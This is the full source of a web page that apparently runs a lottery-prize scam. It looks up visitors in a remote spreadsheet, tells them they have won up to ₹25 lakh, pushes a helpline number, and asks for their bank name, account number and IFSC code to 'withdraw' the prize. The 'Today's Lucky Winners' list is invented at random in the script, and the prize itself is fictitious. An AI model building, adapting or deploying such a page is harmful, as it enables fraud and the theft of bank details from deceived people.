<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Customer Status Verification</title>
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      min-height: 100vh;
      margin: 0;
      padding: 15px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .box {
      background: #ffffff;
      padding: 20px;
      border-radius: 10px;
      width: 100%;
      max-width: 420px;
      box-sizing: border-box;
      margin-bottom: 15px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    }
    .text-center { text-align: center; }
    .live-dot {
      width: 10px;
      height: 10px;
      background: #ff1744;
      border-radius: 50%;
      display: inline-block;
      box-shadow: 0 0 8px #ff1744;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0 15px;
      box-sizing: border-box;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 11px;
      background: #1a73e8;
      color: #fff;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }
    .btn-green { background: #27ae60; margin-top: 10px; }
    .btn-link { background: none; color: #555; border: 1px solid #ccc; margin-top: 8px; }
    .item {
      display: flex;
      justify-content: space-between;
      padding: 8px 0;
      border-bottom: 1px solid #eee;
      font-size: 14px;
    }
    .badges {
      display: flex;
      flex-wrap: wrap;
      gap: 5px;
      max-height: 90px;
      overflow-y: auto;
    }
    .badge {
      background: #eee;
      padding: 3px 6px;
      border-radius: 4px;
      font-size: 11px;
      font-family: monospace;
    }
  </style>
</head>
<body>

  <!-- STEP 1: Search -->
  <div id="step1" class="box text-center">
    <div id="clock" style="color: #1a73e8; font-size: 13px; font-weight: bold;"></div>
    <div style="font-size: 13px; margin: 5px 0;">Helpline: <a href="tel:8709171965" style="color: #d93025; font-weight: bold;">8709171965</a></div>
    <h3 style="margin: 12px 0;"><span class="live-dot"></span> Live Result Check</h3>
    <input type="text" id="userInput" placeholder="Ticket Number / Mobile Number">
    <button onclick="checkResult()">Check Status</button>
    <div id="msg" style="color: red; font-size: 13px; margin-top: 10px;"></div>
  </div>

  <!-- STEP 2: Celebration -->
  <div id="step2" class="box text-center" style="display: none; border: 2px solid #f1c40f;">
    <h2 style="color: #d93025; margin: 5px 0;">🎉 Congratulations! 🎉</h2>
    <div style="text-align: left; margin: 15px 0;">
      <div class="item"><span>Name:</span><b id="winName"></b></div>
      <div class="item"><span>Mobile:</span><b id="winMobile"></b></div>
      <div class="item"><span>Winning Prize:</span><b id="winPrize" style="color: #27ae60; font-size: 18px;"></b></div>
    </div>
    <button class="btn-green" onclick="showStep(3)">Withdraw Winning Amount</button>
    <button class="btn-link" onclick="showStep(1)">Back</button>
  </div>

  <!-- STEP 3: Form -->
  <div id="step3" class="box" style="display: none;">
    <h3 class="text-center" style="color: #27ae60; margin-top: 0;">Bank Withdrawal Details</h3>
    <label>Bank Name</label>
    <input type="text" id="bankName" placeholder="Bank Name">
    <label>Account Number</label>
    <input type="text" id="bankAcc" placeholder="Account Number">
    <label>IFSC Code</label>
    <input type="text" id="bankIfsc" placeholder="IFSC Code" style="text-transform: uppercase;">
    <button class="btn-green" onclick="submitBank()">Submit Withdrawal Request</button>
    <button class="btn-link" onclick="showStep(2)">Back</button>
  </div>

  <!-- STEP 4: Under Review -->
  <div id="step4" class="box text-center" style="display: none; border-top: 4px solid #f39c12;">
    <h3 style="color: #d68910; margin-top: 0;">⏳ Request Under Review</h3>
    <div style="text-align: left; margin: 15px 0;">
      <div class="item"><span>Holder Name:</span><b id="revName"></b></div>
      <div class="item"><span>Bank:</span><b id="revBank"></b></div>
      <div class="item"><span>Account No:</span><b id="revAcc"></b></div>
      <div class="item"><span>IFSC:</span><b id="revIfsc"></b></div>
      <div class="item"><span>Prize Amount:</span><b id="revPrize" style="color: #27ae60;"></b></div>
      <div class="item"><span>Status:</span><b style="color: #d68910;">Pending Approval</b></div>
    </div>
    <button class="btn-link" onclick="showStep(1)">Check Another</button>
  </div>

  <!-- Winners List (Always Visible) -->
  <div class="box">
    <h4 class="text-center" style="color: #d93025; margin: 0 0 10px;">🏆 Today's Lucky Winners 🏆</h4>
    <div id="winnersList"></div>
  </div>

  <script>
    // Live Clock
    setInterval(() => {
      document.getElementById('clock').textContent = '🕒 ' + new Date().toLocaleString('en-IN');
    }, 1000);

    // Winners Setup
    const list = [
      ["1st Prize: ₹25 Crore", 1],
      ["2nd Prize: ₹10 Crore", 1],
      ["3rd Prize: ₹75 Lakh", 1],
      ["4th Prize: ₹25 Lakh", 12],
      ["5th Prize: ₹1 Lakh", 36]
    ];
    let winHtml = "";
    list.forEach(item => {
      let b = "";
      for (let i = 0; i < item[1]; i++) {
        b += `<span class="badge">KL ${Math.floor(100000 + Math.random() * 900000)}</span>`;
      }
      winHtml += `<div style="margin-bottom: 8px;"><div class="item"><b>${item[0]}</b><span>(${item[1]})</span></div><div class="badges">${b}</div></div>`;
    });
    document.getElementById("winnersList").innerHTML = winHtml;

    // Navigation Helper
    function showStep(num) {
      ['step1', 'step2', 'step3', 'step4'].forEach((id, idx) => {
        document.getElementById(id).style.display = (idx + 1 === num) ? 'block' : 'none';
      });
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    // SheetDB Result Search
    let curData = {};
    async function checkResult() {
      const q = document.getElementById("userInput").value.trim().toLowerCase();
      const msg = document.getElementById("msg");
      if (!q) { msg.textContent = "Please enter ticket/mobile number."; return; }
      msg.textContent = "Searching...";

      try {
        const res = await fetch("https://sheetdb.io/api/v1/u2lswkzde626d");
        const data = await res.json();
        const record = data.find(r => Object.values(r).some(v => String(v).trim().toLowerCase() === q));

        if (record) {
          msg.textContent = "";
          curData = {
            name: record.name || record.Name || "Customer",
            mobile: record.mobile || record.Mobile || q,
            prize: record.amount || record.Amount || "₹25,00,000"
          };
          if (!curData.prize.includes("₹")) curData.prize = "₹" + curData.prize;

          document.getElementById("winName").textContent = curData.name;
          document.getElementById("winMobile").textContent = curData.mobile;
          document.getElementById("winPrize").textContent = curData.prize;

          showStep(2);
          confetti({ particleCount: 80, spread: 60, origin: { y: 0.6 } });
        } else {
          msg.textContent = "No record found. Please verify number.";
        }
      } catch (e) {
        msg.textContent = "Database connection error.";
      }
    }

    // Submit Bank Details
    function submitBank() {
      const bank = document.getElementById("bankName").value.trim();
      const acc = document.getElementById("bankAcc").value.trim();
      const ifsc = document.getElementById("bankIfsc").value.trim().toUpperCase();

      if (!bank || !acc || !ifsc) {
        alert("Please fill all details.");
        return;
      }

      document.getElementById("revName").textContent = curData.name || "-";
      document.getElementById("revBank").textContent = bank;
      document.getElementById("revAcc").textContent = acc.length > 4 ? "XXXX-XXXX-" + acc.slice(-4) : acc;
      document.getElementById("revIfsc").textContent = ifsc;
      document.getElementById("revPrize").textContent = curData.prize || "-";

      showStep(4);
    }
  </script>
</body>
</html>
